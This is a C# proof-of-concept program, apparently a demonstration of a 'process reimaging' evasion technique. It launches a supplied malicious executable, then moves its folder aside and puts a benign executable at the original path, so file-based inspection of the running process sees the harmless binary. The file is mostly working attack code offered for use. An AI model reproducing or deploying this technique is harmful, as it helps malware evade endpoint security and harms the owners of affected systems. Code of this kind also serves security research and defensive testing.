using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Diagnostics;

namespace CSProcessReimagingPOC
{
    class Program
    {
        static void Usage()
        {
            string usageStr = @"
Usage:
    .\poc.exe C:\\path\\to\\bad\\exe.exe C:\\path\\to\\benign\\exe.exe
";
            Console.WriteLine(usageStr);
        }
        static void Main(string[] args)
        {
            if (args.Length != 2)
            {
                Usage();
                return;
            }
            string badExe = args[0];
            string goodExe = args[1];
            if (!File.Exists(badExe))
            {
                Console.WriteLine("[-] Error: {0} does not exist.", badExe); ;
                return;
            }
            if (!File.Exists(goodExe))
            {
                Console.WriteLine("[-] Error: {0} does not exist.", goodExe);
            }
            string curDir = Directory.GetCurrentDirectory();
            string executingDir = curDir + "\\executing";
            string hiddenDir = curDir + "\\hidden";
            Directory.CreateDirectory(executingDir);
            string phaseOnePath = executingDir + "\\phase1.exe";
            Console.WriteLine("[*] Copying {0} to {1}", badExe, phaseOnePath);
            File.Copy(badExe, phaseOnePath);
            Console.WriteLine("[*] Starting {0}", phaseOnePath);
            Process.Start(phaseOnePath);
            Console.WriteLine("[*] Started! Moving the directory to hidden...");
            Directory.Move(executingDir, hiddenDir);
            Console.WriteLine("[*] Recreating the executing directory...");
            Directory.CreateDirectory(executingDir);
            Console.WriteLine("[*] Moving {0} to executing\\phase1.exe...");
            File.Copy(goodExe, phaseOnePath);
            Console.WriteLine("[+] All done!");
        }
    }
}
